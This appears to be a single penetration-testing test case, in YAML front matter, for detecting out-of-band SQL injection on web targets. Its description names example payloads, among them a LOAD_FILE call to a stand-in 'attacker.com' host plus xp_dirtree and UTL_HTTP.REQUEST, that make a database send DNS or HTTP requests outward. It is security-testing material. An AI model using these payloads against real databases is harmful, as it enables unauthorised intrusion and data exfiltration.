---
testcase: OOB DNS/HTTP Triggering – Inject payloads that cause the database to make outbound DNS/HTTP requests (e.g., LOAD_FILE('\\\\attacker.com\\payload'), xp_dirtree, UTL_HTTP.REQUEST) and monitor via OAST services or DNS loggers to detect possible OOB SQLi
platforms: 
  - Web
  - Network
methodology: 
  - BlackBox
  - GreyBox
vulnerabilities:
  - SQL injection
services:
  - WEB
references:
  - https://portswigger.net/web-security/sql-injection
  - https://portswigger.net/web-security/sql-injection/cheat-sheet
---
